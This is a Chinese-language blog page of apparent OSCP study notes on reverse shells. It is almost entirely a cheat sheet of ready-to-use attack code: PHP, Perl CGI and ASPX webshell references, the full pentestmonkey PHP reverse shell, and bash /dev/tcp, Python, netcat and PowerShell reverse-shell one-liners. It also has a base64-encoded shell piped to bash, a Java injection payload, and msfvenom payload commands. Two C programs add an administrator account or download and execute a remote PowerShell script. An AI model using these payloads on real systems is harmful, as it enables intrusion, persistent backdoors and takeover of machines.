<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>反弹shell | 养猪日记</title>
<meta name=keywords content><meta name=description content='https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block
PHP:
1、webshell代码：
<?php system($_REQUEST[&#39;a&#39;]);?>
使用方式：
?a=id

<?php system($_GET[&#39;a&#39;]);?>
使用方式：
&amp;a=id

<?php echo system($_GET[&#39;cmd&#39;]); ?>

如果有拦截，可以尝试以下代码：
<?=`$_GET[0]`?>

2、反弹shell代码：
<?php exec("/bin/bash -c &#39;bash -i >& /dev/tcp/192.168.254.128/8888 0>&amp;1&#39;"); ?>
                bash -c "bash -i >& /dev/tcp/192.168.45.205/4444 0>&amp;1"

3、php代码

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = &#39;10.10.16.12&#39;;  // You have changed this
  $port = 8888;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists(&#39;pcntl_fork&#39;)) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can&#39;t fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can&#39;t setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can&#39;t spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process&#39;s STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process&#39;s STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process&#39;s STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we&#39;ve daemonised ourself
  // (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 

4、命令执行

<?php system("whoami");?>
本地自带的phpwebshell:'><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/oscp/%E5%8F%8D%E5%BC%B9shell/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/oscp/%E5%8F%8D%E5%BC%B9shell/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">反弹shell</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1010 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#php>PHP:</a></li></ul><ul><li><a href=#nc>NC:</a></li><li><a href=#cgi-pl后缀的webshell>CGI pl后缀的webshell：</a></li><li><a href=#python>python</a></li><li><a href=#base64>base64</a></li><li><a href=#msfvenom>msfvenom</a></li><li><a href=#congfig后缀的木马>congfig后缀的木马</a></li></ul></nav></div></details></div><div class=post-content><p><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block</a></p><h2 id=php>PHP:<a hidden class=anchor aria-hidden=true href=#php>#</a></h2><pre tabindex=0><code>1、webshell代码：
&lt;?php system($_REQUEST[&#39;a&#39;]);?&gt;
使用方式：
?a=id

&lt;?php system($_GET[&#39;a&#39;]);?&gt;
使用方式：
&amp;a=id

&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;

如果有拦截，可以尝试以下代码：
&lt;?=`$_GET[0]`?&gt;

2、反弹shell代码：
&lt;?php exec(&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.254.128/8888 0&gt;&amp;1&#39;&#34;); ?&gt;
                bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.45.205/4444 0&gt;&amp;1&#34;

3、php代码

  &lt;?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = &#34;1.0&#34;;
  $ip = &#39;10.10.16.12&#39;;  // You have changed this
  $port = 8888;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists(&#39;pcntl_fork&#39;)) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit(&#34;ERROR: Can&#39;t fork&#34;);
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit(&#34;Error: Can&#39;t setsid()&#34;);
      exit(1);
    }

    $daemon = 1;
  } else {
    printit(&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;);
  }

  // Change to a safe directory
  chdir(&#34;/&#34;);

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit(&#34;$errstr ($errno)&#34;);
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;),  // stdin is a pipe that the child will read from
    1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;),  // stdout is a pipe that the child will write to
    2 =&gt; array(&#34;pipe&#34;, &#34;w&#34;)   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit(&#34;ERROR: Can&#39;t spawn shell&#34;);
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit(&#34;Successfully opened reverse shell to $ip:$port&#34;);

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit(&#34;ERROR: Shell connection terminated&#34;);
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit(&#34;ERROR: Shell process terminated&#34;);
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process&#39;s STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit(&#34;SOCK READ&#34;);
      $input = fread($sock, $chunk_size);
      if ($debug) printit(&#34;SOCK: $input&#34;);
      fwrite($pipes[0], $input);
    }

    // If we can read from the process&#39;s STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit(&#34;STDOUT READ&#34;);
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit(&#34;STDOUT: $input&#34;);
      fwrite($sock, $input);
    }

    // If we can read from the process&#39;s STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit(&#34;STDERR READ&#34;);
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit(&#34;STDERR: $input&#34;);
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we&#39;ve daemonised ourself
  // (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print &#34;$string
&#34;;
    }
  }

  ?&gt; 

4、命令执行

&lt;?php system(&#34;whoami&#34;);?&gt;
</code></pre><p>本地自带的phpwebshell:</p><p>locate php-reverse-shell.php</p><p>/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/simple-backdoor.php</p><h1 id=java-payload>java payload<a hidden class=anchor aria-hidden=true href=#java-payload>#</a></h1><pre tabindex=0><code>${script:javascript:java.lang.Runtime.getRuntime().exec(&#39;/bin/bash -c bash$IFS$9-i&gt;&amp;/dev/tcp/192.168.45.185/4444&lt;&amp;1&#39;)}

此处可信任burp的编码，CyberChef不可



/bin/bash -c bash$IFS$9-i&gt;&amp;/dev/tcp/192.168.45.223/4444&lt;&amp;1
/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.119.3/4444 0&gt;&amp;1&#34;
</code></pre><h2 id=nc>NC:<a hidden class=anchor aria-hidden=true href=#nc>#</a></h2><pre tabindex=0><code>nc可用链接：
https://github.com/int0x33/nc.exe/blob/master/nc.exe

windows：
C:\windows\temp\nc.exe -e cmd.exe 10.10.16.6 8888
</code></pre><h2 id=cgi-pl后缀的webshell>CGI pl后缀的webshell：<a hidden class=anchor aria-hidden=true href=#cgi-pl后缀的webshell>#</a></h2><p>使用方式：webshell.pl?password=yourpassword</p><pre tabindex=0><code>use CGI; use Cwd; print CGI::header( -type =&gt; &#39;text/html&#39; ); my $command = CGI::param(&#39;command&#39;); my $pwd = CGI::param(&#39;pwd&#39;) || &#39;&#39;; my $password = CGI::param(&#39;password&#39;); my $filename = CGI-&gt;script_name() ; if ( $password ne &#39;yourpassword&#39; ) { print &#34;Please provide a valid password.\n&#34;; exit(0) } $pwd = $pwd eq &#39;&#39; ? `pwd` : $pwd; my $home = Cwd::cwd(); chdir($pwd); my $result=&#39;&#39;; if ($command =~ /^cd\s*(.*)/) { my $dir = $1 or &#39;&#39;; if ($dir eq &#39;&#39;) { chdir($home); } else { chdir($dir); } $pwd = Cwd::cwd(); $result = `ls -la`; } else { $result = `$command`; } print &lt;&lt;EOF; &lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD HTML 4.01//EN&#34; &#34;http://www.w3.org/TR/html4/strict.dtd&#34;&gt; &lt;html&gt;&lt;head&gt; &lt;meta content=&#34;text/html; charset=ISO-8859-1&#34; http-equiv=&#34;content-type&#34;&gt;&lt;title&gt;console&lt;/title&gt; &lt;script&gt; window.onload = function(){ document.getElementById(&#34;command&#34;).focus(); } &lt;/script&gt; &lt;style type=&#34;text/css&#34;&gt; .wide1 { border-width: thick; width: 100%; height: 600px; } .wide2 { setFocus; border-width: thick; width: 100%; } &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;p&gt; Script: $filename PWD: $pwd &lt;br/&gt; &lt;textarea class=&#34;wide1&#34; readonly=&#34;readonly&#34; cols=&#34;1&#34; rows=&#34;1&#34; name=&#34;result&#34;&gt; $result &lt;/textarea&gt;&lt;/p&gt; &lt;form method=&#34;get&#34; action=&#34;$filename&#34; name=&#34;command&#34;&gt;Command:  &lt;input class=&#34;wide2&#34; name=&#34;command&#34; id=&#34;command&#34;&gt;&lt;br&gt; &lt;input name=&#34;password&#34; value=&#34;$password&#34; type=&#34;hidden&#34;&gt; &lt;input name=&#34;pwd&#34; value=&#34;$pwd&#34; type=&#34;hidden&#34;&gt; &lt;/form&gt; &lt;br&gt; &lt;/body&gt;&lt;/html&gt; EOF exit 0;
</code></pre><h2 id=python>python<a hidden class=anchor aria-hidden=true href=#python>#</a></h2><pre tabindex=0><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.5.104&#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);
</code></pre><h2 id=base64>base64<a hidden class=anchor aria-hidden=true href=#base64>#</a></h2><pre tabindex=0><code>echo &#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==&#34; | base64 -d | bash
</code></pre><h2 id=msfvenom>msfvenom<a hidden class=anchor aria-hidden=true href=#msfvenom>#</a></h2><pre tabindex=0><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=8889 -f aspx

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.157 LPORT=7766 -f elf &gt; rootshell


msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f war &gt; shell.war

msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw &gt; shell.jsp

/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/simple-backdoor.php



msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.214 LPORT=445 -f war &gt; /home/kali/Desktop/shell.war
</code></pre><h2 id=congfig后缀的木马>congfig后缀的木马<a hidden class=anchor aria-hidden=true href=#congfig后缀的木马>#</a></h2><p><a href=https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/>https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/</a></p><p><a href=https://github.com/0xPurpl3john/web.config>https://github.com/0xPurpl3john/web.config</a></p><p>这个后缀在IIS7.0以上是可以getshell的</p><p>修改项目里面的参数即可</p><p>seclists字典：
sudo apt -y install seclists</p><p><a href=https://github.com/danielmiessler/SecLists/>https://github.com/danielmiessler/SecLists/</a></p><p>/usr/share/seclists/Fuzzing/extensions-skipfish.fuzz.txt</p><h1 id=powershell>powershell<a hidden class=anchor aria-hidden=true href=#powershell>#</a></h1><p>通过powershell创建反向shell连接：</p><pre tabindex=0><code>powershell -nop -c &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&#39;10.10.16.5&#39;&#39;,80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data | Out-String );$sendback2 = $sendback + &#39;&#39;PS &#39;&#39; + (pwd).Path + &#39;&#39;&gt; &#39;&#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34;
</code></pre><p><a href=https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3>https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3</a></p><pre tabindex=0><code>$client = New-Object System.Net.Sockets.TCPClient(&#39;192.168.45.168&#39;,8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex &#34;. { $data } 2&gt;&amp;1&#34; | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
</code></pre><p>powershell -enc +base64调用</p><p>powershell Unicode+base64加密：</p><pre tabindex=0><code>$text = &#34;IEX ((new-object net.webclient).downloadstring(&#39;http://38.147.171.208:80/a&#39;))&#34;

[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text), &#39;InsertLineBreaks&#39;)
</code></pre><h1 id=aspx>aspx:<a hidden class=anchor aria-hidden=true href=#aspx>#</a></h1><pre tabindex=0><code>https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx
</code></pre><p>asp：</p><pre tabindex=0><code>https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/webshell#log-poisoning--lfi--shell
</code></pre><h1 id=手搓exe>手搓EXE：<a hidden class=anchor aria-hidden=true href=#手搓exe>#</a></h1><p>安装编译器：</p><pre tabindex=0><code>sudo apt install mingw-w64
</code></pre><p>报错解决方法：</p><p>32位的编译：</p><pre tabindex=0><code>i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
</code></pre><p>addusr.c</p><pre tabindex=0><code>#include &lt;stdlib.h&gt;

int main ()
{
  int i;
  
  i = system (&#34;net user dave2 password123! /add&#34;);
  i = system (&#34;net localgroup administrators dave2 /add&#34;);
  
  return 0;
}
</code></pre><p>64位的编译：</p><pre tabindex=0><code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
</code></pre><p>反弹shell.exe:</p><pre tabindex=0><code>#include &lt;stdlib.h&gt;

int main ()
{
  int i;
  
  i = system (&#34;powershell.exe -nop -w hidden -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.159:81/81_6543.ps1&#39;)&#34;);
  
  return 0;
}
</code></pre><h1 id=nc-正向shell>nc 正向shell：<a hidden class=anchor aria-hidden=true href=#nc-正向shell>#</a></h1><pre tabindex=0><code>nc -lvp 8888 -e /bin/bash 
nc -lvp 8890 -e cmd.exe
</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/oscp/windows-%E6%8F%90%E6%9D%83/><span class=title>« Prev</span><br><span>windows 提权</span>
</a><a class=next href=http://localhost:1313/posts/oscp/%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7/><span class=title>Next »</span><br><span>另类技巧</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>